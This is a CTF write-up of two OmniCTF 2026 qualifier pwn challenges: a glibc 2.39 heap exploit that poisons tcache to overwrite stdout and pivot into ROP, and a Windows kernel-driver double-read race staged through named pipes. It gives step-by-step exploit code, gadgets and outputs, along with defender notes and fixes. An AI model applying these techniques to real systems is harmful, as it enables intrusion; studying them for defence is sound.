---
title: "OmniCTF 2026 Quals Pwn Writeup: 2 Challenges Solved"
slug: "omnictf-2026-quals-pwn-writeup"
description: "OmniCTF 2026 Quals pwn step-by-step: nullshui glibc 2.39 heap null-write to tcache poison over _IO_2_1_stdout_; WinCapture Windows kernel-driver COPY TOCTOU race."
date: 2026-07-19T17:00:00Z
lastmod: 2026-07-19T17:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["OmniCTF 2026 Quals"]
tags:
  - "omnictf"
  - "omnictf 2026"
  - "omnictf quals"
  - "ctf writeup"
  - "pwn"
  - "binary exploitation"
  - "glibc heap exploitation"
  - "tcache poisoning"
  - "safe-linking bypass"
  - "_IO_2_1_stdout_ overwrite"
  - "wide file vtable setcontext"
  - "heap rop"
  - "windows kernel driver"
  - "ioctl race condition"
  - "toctou double-read"
  - "named pipe partial send"
  - "ubuntu 24.04 exploitation"
keywords:
  - "omnictf 2026 quals pwn writeup"
  - "omnictf nullshui writeup"
  - "omnictf wincapture writeup"
  - "glibc 2.39 tcache poisoning writeup"
  - "_IO_2_1_stdout_ wide file exploitation"
  - "safe-linking heap leak bypass"
  - "wincapture toctou double-read race"
  - "windows kernel driver ioctl race"
  - "named pipe partial send race technique"
  - "heap-relative zero-write primitive"
  - "cet shstk ibt bypass ctf"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/omnictf-2026-quals-pwn-writeup.png"
  alt: "OmniCTF 2026 Quals pwn writeup — two challenges solved covering nullshui glibc 2.39 heap exploitation via a heap-relative zero-write primitive that unlocks tcache poisoning over _IO_2_1_stdout_ with a fake wide-file vtable calling setcontext to pivot to a heap ROP open/read/write chain, and WinCapture Windows kernel-driver TOCTOU race between two reads of slot_lengths inside the COPY IOCTL exploited via named-pipe partial sends to interleave a LOAD that flips 8 bytes into a 4 KB overflow into an adjacent key object"
---

OmniCTF 2026 Quals shipped a pwn track with two challenges from very different worlds. **nullshui** (hard, 500 points, 0 solves at release) is glibc 2.39 heap exploitation on Ubuntu 24.04 with every modern mitigation turned on (Full RELRO, canary, NX, PIE, SHSTK, IBT). **WinCapture** (medium, 111 points, 39 solves) is a Windows kernel-driver TOCTOU race exposed through a named pipe. What they share is a design shape worth noticing: neither one lets you spawn a shell (Ubuntu 24.04 hardening on one side, kernel-mode context on the other both make direct shellcode impractical), neither relies on a stack smash, and the winning primitive in both is a **narrow write into carefully-shaped adjacent state** that a defender would look at and say "too small to exploit in practice."

Handouts, per-challenge READMEs, and solver scripts live at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals). This writeup covers the two pwn challenges I solved. The paired [OmniCTF 2026 Quals web writeup](/ctf-writeups/omnictf-2026-quals-web-writeup/) walks Ganzir (SSTI via reset-token debug leak into a Jinja2 `read_file` helper) and StayWild (GNU tar `--checkpoint-action` option injection through unfiltered upload filenames).

## The two OmniCTF 2026 Quals pwn challenges

| Challenge | Difficulty | Bug class / primitive | Flag |
|---|---|---|---|
| nullshui | Hard (0 solves at release) | Ubuntu 24.04 heap runner with a 4-option menu (alloc / free / view / zero). `view` prints until NUL, leaking stale allocator metadata after short data reads. `zero` writes one zero qword at a caller-supplied heap-relative qword index. Chain: largebin pointer leak for libc, heap pointer leak, zero-write clears freed-chunk metadata to build a controlled overlap, forged tcache entry with safe-linking mask `chunk >> 12` (heap leak makes this computable) points a `0x410` allocation at `_IO_2_1_stdout_`. Fake `_IO_FILE` sets `_wide_data`, `vtable = _IO_wfile_jumps`, and `__doallocate` = `setcontext`. Stdout flush pivots to a heap ROP that opens `/home/ctf/flag.txt`, reads, writes to stdout, exits. | `OmniCTF{145963c105e9ed8dbf6d95c06fb552fe63062dcdd885bd4c208a4693b8af8a30}` |
| WinCapture | Medium | PE64 Windows kernel driver behind `\\.\pipe\WinCapture` exposing 5 IOCTLs (LOAD, RESERVE, COMMIT, COPY, FLAG). `COPY` double-reads `slot_lengths[slot]`: once for a bounds check against `pending_len`, again as the `memcpy` length. A concurrent LOAD between the two reads changes the length from 8 to 0x1000, turning a validated 8-byte copy into a 4 KB overflow. Arena layout with RESERVE(8) + COMMIT places `g_key` at `arena + 0x10`; slot data seeded with `{magic=0x4b455901, unlock=0x00000001}` records every 16 bytes lands the correct pattern at `g_key` regardless of alignment. Named-pipe partial sends stage COPY and LOAD so both server threads block on their last input byte, then release COPY first (slot index) and LOAD after a spin delay (final body byte). FLAG accepts the corrupted key and returns the flag. | `OmniCTF{d1_dae431103c2a7f5f_fbad1838330dd40a5a079af804fc29ef_f56e59b567b4df4f6f600a089af8ab92}` |

The two challenges share a defensive theme worth stating up front: **"too small to exploit in practice" is a claim that requires proof, not a defence**. WinCapture's prompt literally says management decided the race window was too small to matter; the exploit lands on attempt 0 with delay 0. nullshui's whole surface is one zero-qword write at a caller-supplied heap-relative offset; that is the entire weapon and it's enough to reach code execution under a full modern mitigation stack. Any bug review that dismisses a primitive on subjective narrowness (a race window, an off-by-one, a single-bit flip, an unsigned wrap) should treat that dismissal as a hypothesis to be tested with a working exploit, not a defence.

## Methodology — narrow primitive, patient plumbing

A pattern that worked on both challenges: **the primitive is small, the plumbing is where the work lives**. nullshui's zero-qword write is the *whole* weapon, and every one of the exploit's eight steps is heap-shape choreography around it: build a specific chunk layout so the next leak lands on the field you need, arrange freed-chunk metadata so the next `zero` write turns a benign field into an attacker-controlled forward pointer. WinCapture's TOCTOU race window is a full function call wide (which is enormous by kernel race standards), but the exploit still needs precise named-pipe staging to interleave the LOAD write between the two `slot_lengths` reads inside COPY, plus specific arena calibration so the corrupted memory lands exactly on the adjacent key object.

For nullshui specifically, the discipline is to always work in terms of *offsets from a leaked base*. Every address in the final exploit is `libc.address + <constant>` or `heap_base + <constant>`. The Dockerfile pins Ubuntu 24.04 by SHA digest, and the handout ships the exact `libc.so.6` and `ld-linux-x86-64.so.2` from that image; extract them locally and pin your `pwntools` `ELF` and `libc.address` against those binaries. Any glibc heap exploit is version-sensitive down to the byte, and a mismatched libc during development is the fastest way to burn hours on chunk layouts that don't reproduce.

For WinCapture, the discipline is to *dismiss the wrong race first*. The obvious primitive is racing RESERVE and COMMIT against each other so their allocations alias (both draw from the same arena without a lock), and if you can make `g_pending_ptr == g_key` then a normal 8-byte COPY writes the magic + unlock pair directly. That works in theory, and I confirmed several successful RESERVE and COMMIT calls, but the final pointers didn't alias reliably across runs. The stable bug is one layer later, inside COPY, where the double-read of `slot_lengths[slot]` is a *deterministic* invariant violation as soon as a concurrent LOAD lands between the reads.

Per-challenge walkthroughs follow.

## 1. nullshui

Hard glibc 2.39 heap exploitation. Zero solves at release. The whole exploit turns one primitive (write one zero qword at a heap-relative qword index) into a full ROP chain via `_IO_2_1_stdout_`.

### Step 1 — Triage the binary

```
$ file main
main: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped

Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
```

Every modern mitigation. No direct GOT overwrite (Full RELRO), no shellcode (NX), no direct return-address smash (canary + PIE + SHSTK + IBT). The intended path has to reach code execution *without* returning into shellcode and *without* corrupting a return address CFI would refuse to honour.

The Dockerfile pins Ubuntu 24.04 by digest:

```dockerfile
FROM ubuntu:24.04@sha256:023f8a753c22258c9fe2d0005a7d28258038da7d620e9f93e9ad78aa266f9f11
```

Extract the exact `libc.so.6` and `ld-linux-x86-64.so.2` from that image and commit them alongside the solver; the exploit uses libc-relative offsets throughout, and any mismatch breaks chunk layouts.

### Step 2 — Menu and primitives

```
1. alloc
2. free
3. view
4. zero
5. exit
```

Two implementation quirks make the interface exploitable. First, the data read in `alloc` accepts short reads: request a 0x520 chunk with only 8 bytes of marker data and the rest of the user area is left as whatever allocator metadata was there before. Second, `view` prints from the chunk until a NUL byte, so a short marker followed by stale allocator pointers becomes a leak.

The `zero` option is the actual weapon:

```python
c.zero_qword_at_heap_offset((p_user + 0x10) - heap_base)
```

Internally the menu takes the supplied number as a *qword* index. Once the heap base is known we can clear any 8-byte-aligned metadata slot on the heap.

### Step 3 — Leak libc via a largebin pointer

Shape the heap so a `0x520` chunk lands in the largebin, then reuse it and short-read to expose the largebin pointer:

```python
c.alloc(0, 0x410, b"A")
c.alloc(1, 0x500, b"P")
c.alloc(2, 0x100, b"G")
c.alloc(3, 0x520, b"Q")
c.alloc(4, 0x100, b"G")
c.alloc(7, 0x400, b"F")

c.free(1)
c.free(3)
c.alloc(5, 0x1000, b"R")   # forces sort into largebin
```

Reallocate the `0x520` slot with an 8-byte marker, then `view(3)` leaks the trailing largebin pointer. For this libc:

```
main_arena                    = libc + 0x203ac0
largebin_index_64(0x510) head = main_arena + 0x490
libc.address = largebin_head - (0x203ac0 + 0x490)
```

Reject non-page-aligned candidates as a sanity check.

### Step 4 — Leak the heap base

Same sorted-bin layout also produces a heap pointer. Reallocate the `0x500` slot with a 16-byte marker and leak the trailing pointer:

```python
heap_marker = b"H" * 16
c.alloc(1, 0x500, heap_marker)
q_header  = leak_after(c.view(1), heap_marker, "heap leak")
heap_base = q_header - 0xCD0
```

At this point we have both leaks needed to bypass safe-linking and to place any read/write at a known heap address.

### Step 5 — Build a controlled overlap

Fixed heap offsets in the final layout:

```
p_user = heap_base + 0x6c0
l_user = heap_base + 0x2a0
```

Clear the size/metadata field with a targeted zero-write, then rebuild the freed chunk so a subsequent large alloc overlaps a smaller free-list entry:

```python
c.zero_qword_at_heap_offset((p_user + 0x10) - heap_base)
c.alloc(1, 0x500, p64(p_header) * 4 + b"P1")
c.alloc(6, 0x500, b"P2")

c.free(1)
c.free(0)
c.alloc(0, 0x928, make_fake_tcache_payload(p_user, flag_path))
```

The oversized `0x928` allocation contains a forged `0x410` tcache chunk header whose forward pointer we control.

### Step 6 — Bypass safe-linking to target `_IO_2_1_stdout_`

glibc 2.34+ protects tcache forward pointers with safe-linking: the stored pointer is `next ^ (chunk_addr >> 12)`. Because we leaked the heap, we can compute the mask and encode any 16-byte-aligned target:

```python
stdout       = libc.sym["_IO_2_1_stdout_"]
encoded_next = stdout ^ (p_user >> 12)
```

Two subsequent `0x400` allocations then return a pointer overlapping `_IO_2_1_stdout_`. The data written into that allocation is a crafted `_IO_FILE` object.

### Step 7 — Fake wide-`FILE` + `setcontext` pivot

The fake stdout object sets:

```
_lock       -> writable heap memory
_wide_data  -> fake wide-data structure on the heap
vtable      -> _IO_wfile_jumps
```

Inside the fake wide-data structure, the wide vtable's `__doallocate` slot points to `setcontext`:

```python
struct.pack_into("<Q", payload, FAKE_WIDE_VTABLE_OFF + 0x68, libc.sym["setcontext"])
```

The context embedded in the stdout overwrite places a `leave; ret` gadget in the saved instruction pointer and points `rbp` at a heap ROP stack. When glibc flushes stdout (via `_IO_2_1_stdout_->__wide_data->_wide_vtable->__doallocate`), execution pivots cleanly to the heap.

### Step 8 — Heap ROP

The chain avoids spawning a shell (execve would have to build a NULL-terminated argv/envp under CET/SHSTK constraints; direct file read is simpler and sufficient):

```
open("/home/ctf/flag.txt", O_RDONLY, 0)
read(fd, heap_buffer, 0x100)
write(1, heap_buffer, 0x100)
_exit(0)
```

Libc gadgets used:

```
pop rdi; ret                                      libc + 0x10f78b
pop rsi; ret                                      libc + 0x110a7d
pop rdx; add rsp, 0x78; pop rbx; ...; ret         libc + 0x9c5a5
xchg eax, edi; ret                                libc + 0x11b045
leave; ret                                        libc + 0x299d2
ret                                               libc + 0x2882f
```

The `xchg eax, edi; ret` gadget moves the return value from `open` into `rdi` without guessing whether the flag file lands on fd 3.

Run against a fresh instance:

```
$ python3 solve.py ncat --ssl nullshi-<id>.inst.omnictf.com 1337
[+] libc base:      0x7ff17a925000
[+] heap base:      0x557fb2151000
[*] stdout target:  0x7ff17ab295c0
[*] heap ROP stack: 0x557fb21518e0
OmniCTF{145963c105e9ed8dbf6d95c06fb552fe63062dcdd885bd4c208a4693b8af8a30}
```

Per-challenge README + solver: [pwn/nullshui](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/pwn/nullshui).

Two generalisable observations. First, **modern mitigations force chain complexity, not chain impossibility**. Full RELRO + CET + IBT + SHSTK + safe-linking pushed this exploit to eight distinct steps, but every one is a well-known glibc primitive (largebin leak, safe-linking bypass with heap leak, tcache poison, `_IO_2_1_stdout_` overwrite, wide-file `setcontext` pivot, heap ROP). Mitigations raise cost, not ceiling. Second, **the "one small primitive" that reviewers think is too weak is almost always the intended path**. A zero-qword write at a caller-supplied heap-relative offset would look harmless to a code reviewer who didn't already know it enables tcache poisoning. The offset field is arbitrary; that's the whole exploit surface.

## 2. WinCapture

A PE64 Windows kernel driver behind a named pipe. The intended bug is a TOCTOU double-read inside the `COPY` IOCTL. The prompt literally names it ("An internal audit flagged a race condition ... management decided the window is 'too small to exploit in practice.'") and challenges you to prove management wrong.

### Step 1 — Triage the driver

```
$ file WinCapture.sys
WinCapture.sys: PE32+ executable (native) x86-64, for MS Windows
```

The remote runner is unusually helpful:

```
Driver interface: \\.\pipe\WinCapture
Protocol: See WinCapture.sys (binary IOCTL over named pipe)
Send exploit.exe as base64. Paste line by line, then END.
```

The pipe protocol is simple:

```
request  = u32 ioctl_code || u32 input_length || input_bytes
response = u32 ntstatus   || u32 information  || optional_output
```

So a normal Windows userland program (compiled with MinGW) can connect to the named pipe and speak IOCTLs directly.

### Step 2 — Map the IOCTL surface

`WinCaptureDeviceControl` normalises the IOCTL:

```
lea edx, [rdi + 0x3dffe000]
cmp edx, 0x10
jmp switch_table[edx]
```

Five useful codes:

| IOCTL | Code | Purpose |
|---|---|---|
| LOAD | `0xC2002000` | Load a slot buffer and set its logical length |
| RESERVE | `0xC2002004` | Reserve one pending capture buffer |
| COMMIT | `0xC2002008` | Allocate and initialise a 16-byte key object |
| COPY | `0xC200200C` | Copy a slot into the pending buffer |
| FLAG | `0xC2002010` | Return the flag if the key object is unlocked |

Global driver state:

```
0x15000  g_key
0x15008  g_pending_len
0x15010  g_pending_ptr
0x15020  slot_data[4][0x1000]
0x19020  slot_lengths[4]
0x19030  arena_offset
0x19040  arena
```

### Step 3 — Understand the state machine

`LOAD` expects a body of `0x1008` bytes (`u32 slot`, `u32 slot_len`, `0x1000` bytes of data). It validates `slot <= 3`, stores `slot_len` in `slot_lengths[slot]` (uncapped), then copies exactly `0x1000` bytes into `slot_data[slot]`. Attacker-controlled logical length.

`RESERVE` accepts a requested size 1..512, sets `pending_ptr = arena + arena_offset`, `pending_len = requested_size`, and bumps `arena_offset += align16(requested_size)`.

`COMMIT` allocates a fixed 16-byte key at `arena + arena_offset`, sets the first qword to `0x4b455901`, and bumps `arena_offset += 0x10`.

`FLAG` gates on:

```
g_key != NULL
*(u32 *)(g_key + 0) == 0x4b455901
*(u32 *)(g_key + 4) != 0
output_length > 0x7f
```

The key starts as `01 59 45 4b 00 00 00 00`. The whole goal is to set any non-zero dword at `g_key + 4` without breaking the magic at `g_key + 0`.

### Step 4 — Dismiss the wrong race

Since `RESERVE` and `COMMIT` both allocate from the same arena without a lock, the obvious race is to make them read the same `arena_offset`. If they do, `g_pending_ptr == g_key`, and a normal 8-byte COPY writes the magic + unlock pair directly. Works in theory; fragile in practice. Several swarm runs produced successful `RESERVE` and `COMMIT` calls but the final pointers didn't alias reliably.

Move to the deterministic bug one layer later.

### Step 5 — The real bug in `COPY`

```
mov  edx, dword [slot_lengths + slot*4]      ; first read (bounds check)
cmp  dword [g_pending_len], edx
jb   invalid_parameter
call fcn.00011000                            ; whole function call between the two reads
mov  rcx, qword [g_pending_ptr]
mov  edx, dword [slot_lengths + slot*4]      ; second read (memcpy length)
cmova rdx, 0x1000
memcpy(g_pending_ptr, slot_data[slot], rdx)
```

The bounds check and the copy each read `slot_lengths[slot]` separately, with a full function call in between. A concurrent LOAD can change the value:

```
time A: slot_lengths[0] = 8
        COPY validates pending_len >= 8

time B: LOAD changes slot_lengths[0] = 0x1000

time C: COPY re-reads slot_lengths[0] and copies 0x1000 bytes
```

The reserved buffer is still 8 bytes. The second read turns a safe copy into a 4 KB overflow through the driver arena. Race window: a full function call. "Too small to exploit in practice" was wrong.

### Step 6 — Make the overflow hit `g_key`

Arena layout after `RESERVE(8)` + `COMMIT()`:

```
RESERVE(8)  -> pending_ptr = arena + 0x00, pending_len = 8
COMMIT()    -> g_key       = arena + 0x10
```

The 16-byte alignment gap is why the reservation rounds up to 16. A long copy from `pending_ptr` reaches `g_key` at offset `0x10`.

Fill the slot buffer with repeating `{magic, unlock}` records aligned every 16 bytes so any 16-byte-aligned arena offset satisfies FLAG:

```c
for (uint32_t off = 0; off + 8 <= 0x1000; off += 16) {
    *(uint32_t *)(body + 8 + off) = 0x4b455901u;    // magic at (off + 0)
    *(uint32_t *)(body + 8 + off + 4) = 1;          // unlock at (off + 4)
}
```

Regardless of where the copy lands in the arena, the overflow writes:

```
g_key + 0 = 0x4b455901
g_key + 4 = 0x00000001
```

Both FLAG predicates satisfied.

### Step 7 — Stage the race with named-pipe partial sends

The Win32 named-pipe API lets us park two server-side handlers right before their final byte:

1. Stage COPY by sending only the header:

   ```
   IOCTL_COPY || inlen=4
   ```

   Server thread now blocks on the 4-byte slot index.

2. Stage a long LOAD by sending header + `0x1007` bytes of body:

   ```
   IOCTL_LOAD || inlen=0x1008 || first 0x1007 bytes of body
   ```

   Server thread now blocks on the last body byte.

3. Release COPY first (sends slot index `0`).
4. Release LOAD after a spin delay (sends the last body byte).

If the scheduler lands between COPY's two `slot_lengths` reads, the length changes from 8 to `0x1000` in the window:

```c
uint32_t idx = 0;
send_all(copy_pipe, &idx, sizeof(idx));
spin_delay(delay);
send_all(load_pipe, &last_byte, 1);
```

On the solved remote instance the race landed immediately:

```
win attempt=0 delay=0 copy=00000000 load=00000000
```

### Step 8 — Reproduce

Compile with MinGW:

```
$ x86_64-w64-mingw32-gcc exploit.c -O2 -Wall -Wextra -s -o exploit.exe
```

Send to a fresh instance:

```
$ python3 send_exploit.py exploit.exe wincapture-<id>.inst.omnictf.com 1337

setup_load=00000000
setup_reserve=00000000
setup_commit=00000000
win attempt=0 delay=0 copy=00000000 load=00000000
OmniCTF{d1_dae431103c2a7f5f_fbad1838330dd40a5a079af804fc29ef_f56e59b567b4df4f6f600a089af8ab92}
```

Per-challenge README + solver: [pwn/wincapture](https://github.com/Abdelkad3r/OmniCTF-2026-Quals/tree/main/pwn/wincapture).

The fix is straightforward: read `slot_lengths[slot]` once into a local, use the same local for both the bounds check and the `memcpy` length. Or take a lock around the whole validation-plus-copy sequence. Or cap `slot_len` at `0x1000` when `LOAD` stores it (necessary defence in depth but doesn't fix the double-read on its own). Same class of bug has shipped in production Windows drivers for two decades; the ones that make headlines are the ones where the corrupted state happens to include a function pointer.

## Cross-cutting defender notes

Five patterns recur across the OmniCTF 2026 Quals pwn track and translate directly into review or triage heuristics.

**"Too small to exploit in practice" is a hypothesis, not a defence.** WinCapture's TOCTOU race window is a full function call between the two `slot_lengths` reads (enormous by kernel race standards), and the exploit lands on attempt 0. nullshui's whole primitive is one zero-qword write at a heap-relative offset (weak-looking on paper), and eight steps of glibc plumbing turn it into full code execution. Any bug review that dismisses a primitive on subjective narrowness (a small race window, an off-by-one, a single-bit flip, an unsigned wrap that "would never happen") should require a working proof-of-concept before accepting the dismissal, because the actual exploitability question depends on downstream state the reviewer usually hasn't audited in the same detail.

**Modern exploit mitigations force chain complexity, not chain impossibility.** nullshui runs against a full modern mitigation stack (Full RELRO, canary, NX, PIE, SHSTK, IBT, safe-linking). The exploit does not bypass any of them; it *routes around* them by targeting `_IO_2_1_stdout_` and pivoting to `setcontext`, which is a legitimate control-flow transfer that CET/IBT are architecturally required to allow. The lesson is not that mitigations don't matter (they push exploit development from days to weeks and require version-specific research) but that they are speed bumps, not ceilings. Any deployment relying on "we have mitigation X so this class doesn't apply" is one clever primitive away from a live exploit.

**Safe-linking is a speed bump, not a defence.** glibc's safe-linking (introduced in 2.32, refined in 2.34+) stores tcache forward pointers as `next ^ (chunk_addr >> 12)`. That looks like a large mask (12 bits of address bleed into the pointer per shift), but the moment you leak *any* heap address you can compute the mask for any chunk in that heap and forge any tcache next pointer you want. The mitigation raised the cost of tcache poisoning from "know the target address" to "know one heap address and the target address"; that second bit is often free from any adjacent leak.

**Kernel-mode arena allocators without locks are a category.** WinCapture's arena is bumped by `RESERVE`, `COMMIT`, and (implicitly) `COPY` without any lock, in a driver dispatch path that runs concurrently across IOCTL callers. The specific bug is a TOCTOU inside `COPY`, but the class is broader: any kernel data structure that (a) has an attacker-driven allocation path, (b) has an attacker-driven bounds check, (c) has both paths run without synchronisation, is a race candidate. This class has shipped in production Windows drivers for two decades. When code review turns up a kernel-side arena with no lock, treat every double-read as a bug until proven otherwise.

**Pin the runtime bit-exact.** nullshui's Dockerfile pins Ubuntu 24.04 by SHA digest and ships the exact `libc.so.6` and `ld-linux-x86-64.so.2` from that image. That is the *only* way to develop a glibc heap exploit reliably: chunk layouts, largebin offsets, `_IO_wfile_jumps` locations, and setcontext register slots all depend on the specific libc build. Developing against a different point-release of the same major version is the fastest way to burn hours on layouts that don't reproduce against the remote. Any CTF handout that includes a Dockerfile with a digest is telling you which runtime to extract; any handout that doesn't is telling you to fingerprint it yourself before writing solver code.

## Frequently asked questions

### What is OmniCTF 2026 Quals?

OmniCTF 2026 Quals is the qualifier round of the OmniCTF 2026 competition. Challenges span web, pwn, reverse, crypto, game, misc, and forensics. Flags use event-specific namespaces (`CTF{...}`, `OMNICTF{...}`, `OmniCTF{...}`, `omniCTF{...}`) depending on the challenge author's choice. This writeup covers the two pwn challenges I solved (nullshui, WinCapture). The paired [OmniCTF 2026 Quals web writeup](/ctf-writeups/omnictf-2026-quals-web-writeup/) covers Ganzir and StayWild. Per-challenge READMEs and solvers at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals).

### What is the nullshui zero-qword-write primitive?

The `zero` menu option takes a caller-supplied integer, treats it as a qword index (multiplies by 8), and writes eight bytes of `0x00` at `heap_base + index * 8`. It's the only *write* primitive the program exposes beyond the initial `alloc` data buffer. On its own it looks weak: you can zero any 8-byte-aligned slot on the heap. Chained with the `view` leak primitive (which prints an allocated chunk until NUL), it becomes the whole exploit surface. Zero the right metadata slot on a freed chunk and the next `malloc` returns a controlled overlap with a previously freed region, which is enough to forge a tcache entry with a chosen forward pointer.

### How does the safe-linking bypass work in nullshui?

glibc's safe-linking stores tcache and fastbin forward pointers as `stored = next ^ (chunk_addr >> 12)` instead of raw `next`. Reversing without a heap leak requires guessing 40 bits of the mask, which is impractical. With a heap leak, you already know `chunk_addr` for any chunk you're touching, so the mask `chunk_addr >> 12` is computable and `stored = target ^ mask` gives you any 16-byte-aligned forward pointer. nullshui's exploit leaks the heap base via a stale pointer left in a reused `0x500` chunk after a short data read (`view` prints until NUL, exposing the trailing bytes), and from there every subsequent step encodes forward pointers that route to `_IO_2_1_stdout_`.

### Why target `_IO_2_1_stdout_` instead of `__free_hook` or `__malloc_hook`?

`__free_hook` and `__malloc_hook` were removed in glibc 2.34. Ubuntu 24.04 ships glibc 2.39, so those classic tcache-poison-plus-hook-overwrite chains do not apply. `_IO_2_1_stdout_` is one of the still-viable targets in modern glibc: overwriting it with a fake `_IO_FILE` object whose `_wide_data` field points at a heap-controlled wide-file structure lets you route the eventual `fflush(stdout)` (which happens on program exit or when the output buffer fills) through a controlled `_IO_wfile_jumps` vtable. Setting the vtable's `__doallocate` slot to `setcontext` and embedding a saved context in the same overwrite gives you a clean pivot to a heap ROP chain: no function-pointer guessing, no CET violations.

### How does the WinCapture race work and how big is the window?

The `COPY` IOCTL reads `slot_lengths[slot]` twice with a full function call between the reads. The first read is used for a bounds check against `g_pending_len`; the second is used as the `memcpy` length. A concurrent `LOAD` IOCTL that sets `slot_lengths[slot]` from 8 to `0x1000` between the two reads makes `COPY` copy 4 KB into an 8-byte reservation, overflowing into the adjacent 16-byte `g_key` object. The race window is one function call wide, which is enormous by kernel race standards, and the challenge prompt literally quotes management calling it "too small to exploit in practice." The exploit lands on attempt 0 with delay 0.

### How does the named-pipe partial-send technique stage the race?

Windows named pipes let a client send input to a driver-side IOCTL handler in multiple `WriteFile` calls. The server thread blocks on the pipe read until the full expected input is buffered. Sending an `IOCTL_COPY` header without its 4-byte slot index parks the COPY thread inside the driver just before the read completes; sending an `IOCTL_LOAD` header with `0x1007` of the `0x1008` body parks the LOAD thread the same way. Both threads are now blocked one byte short of their expected input. Sending COPY's final byte (the slot index) releases it; a short spin delay; sending LOAD's final byte releases it. The scheduler then interleaves the two threads through the driver in a window narrower than a full IOCTL round-trip. Enough for the double-read to observe both values.

### What's the fix for the WinCapture double-read?

Three layers, all worth applying:

1. Read `slot_lengths[slot]` once into a local variable and use that same local for both the bounds check and the `memcpy` length. Fixes the specific bug.
2. Take a lock (spinlock or fast mutex) around the whole validation-and-copy sequence. Fixes any similar race in adjacent code paths.
3. Cap `slot_len` at `0x1000` when `LOAD` stores it. Doesn't fix the double-read on its own, but bounds any downstream mistake.

The mistake WinCapture ships is the classic TOCTOU: assuming that a value validated at time A remains true at time B, when the value is stored in shared attacker-writable state and there's an unlocked window between A and B.

### What's the broader lesson from the OmniCTF 2026 Quals pwn track?

Two lessons compound. **Modern mitigations are speed bumps for exploit development, not ceilings.** nullshui runs against Full RELRO, canary, NX, PIE, SHSTK, IBT, and safe-linking, and the exploit reaches code execution in eight steps by routing around each mitigation via legitimate control-flow paths (`_IO_2_1_stdout_` fflush → wide-file vtable → `setcontext`). Any deployment claiming "we have mitigation X so this class doesn't apply" is one clever primitive away from a live exploit. **"Too small to exploit in practice" is a hypothesis, not a defence.** Both bugs are ones a reviewer would dismiss on visible size: a single zero-qword write at a heap-relative offset (nullshui); a race window between two reads inside a single function (WinCapture). The exploitability question always depends on downstream state, and the only way to answer it is a working proof-of-concept.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and solver scripts at [Abdelkad3r/OmniCTF-2026-Quals](https://github.com/Abdelkad3r/OmniCTF-2026-Quals). nullshui ships a Python `solve.py` (uses `pwntools`, plus the extracted `libc.so.6` and `ld-linux-x86-64.so.2` from the pinned Ubuntu 24.04 image). WinCapture ships `exploit.c` (compile with MinGW) and `send_exploit.py` (base64 helper for the remote runner). Both are reproducible against fresh remote instances.

## Closing notes

Two pwn challenges from opposite ends of the platform spectrum, one shared lesson: **the primitive that a reviewer dismisses as too small is often the intended path, and the plumbing around it is where the real exploit work lives**. nullshui's zero-qword write and WinCapture's double-read race are both bugs a code reviewer would look at and mentally park; both take the whole CTF slot to weaponise into a full exploit chain, and both are entirely stable in the final form.

For adjacent web content on the same site, the [OmniCTF 2026 Quals web writeup](/ctf-writeups/omnictf-2026-quals-web-writeup/) covers Ganzir (SSTI via a reset-token debug leak into a Jinja2 `read_file` helper) and StayWild (GNU tar `--checkpoint-action` option injection through unfiltered upload filenames). For the reverse track, the [OmniCTF 2026 Quals reverse writeup](/ctf-writeups/omnictf-2026-quals-reverse-writeup/) covers CredVault (Parcel migration mismatch), Gatekeep (FPGA byte-circuit constraint solve), Kant (multi-round Rust checker pipeline inversion), and Pusher (signal-driven i386 VM). For the crypto track, the [OmniCTF 2026 Quals crypto writeup](/ctf-writeups/omnictf-2026-quals-crypto-writeup/) covers dual_linera (two-modulus LWE + LLL), Whiskerfield-Meowtin (DH mod `65537^16` one-byte patch), and Orbital-Strike-Cannon (non-associative octonion state, per-satellite RREF). Adjacent pwn writeups on the site: the [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) covers a seccomp-restricted ORW shellcode, a four-gate `gets()` chain with stack-aligned ret2win, and a Roblox server-side Lua sandbox with write-over-read-protection. The [Junior.Crypt 2026 pwn + reverse writeup](/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/) walks a negative-index array OOB with cookie-encoded function pointers, a session-to-sink UAF with fake vtable, a reclassify-without-realloc heap OOB, and a modified-TCC-compiler VM with an ELF-relocation-derived key. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is OmniCTF 2026 Quals?","acceptedAnswer": {"@type": "Answer","text": "OmniCTF 2026 Quals is the qualifier round of the OmniCTF 2026 competition, with challenges spanning web, pwn, reverse, crypto, game, misc, and forensics. Flags use event-specific namespaces (CTF{...}, OMNICTF{...}, OmniCTF{...}, omniCTF{...}) depending on the challenge. This writeup covers the two pwn challenges I solved (nullshui, WinCapture). The paired web writeup at /ctf-writeups/omnictf-2026-quals-web-writeup/ covers Ganzir and StayWild. Per-challenge READMEs and solvers at github.com/Abdelkad3r/OmniCTF-2026-Quals."}},
    {"@type": "Question","name": "What is the nullshui zero-qword-write primitive?","acceptedAnswer": {"@type": "Answer","text": "The zero menu option takes a caller-supplied integer, treats it as a qword index (multiplies by 8), and writes eight bytes of 0x00 at heap_base + index*8. On its own it looks weak. Chained with the view leak primitive (which prints an allocated chunk until NUL, exposing stale allocator metadata after short data reads), it becomes the whole exploit surface. Zero the right metadata slot on a freed chunk and the next malloc returns a controlled overlap with a previously freed region, enough to forge a tcache entry with a chosen forward pointer."}},
    {"@type": "Question","name": "How does the safe-linking bypass work in nullshui?","acceptedAnswer": {"@type": "Answer","text": "glibc stores tcache forward pointers as stored = next XOR (chunk_addr >> 12). Reversing without a heap leak requires guessing 40 bits of the mask. With a heap leak you know chunk_addr for any chunk, so mask = chunk_addr >> 12 is computable and stored = target XOR mask gives any 16-byte-aligned forward pointer. nullshui leaks the heap base via a stale pointer left in a reused 0x500 chunk after a short data read."}},
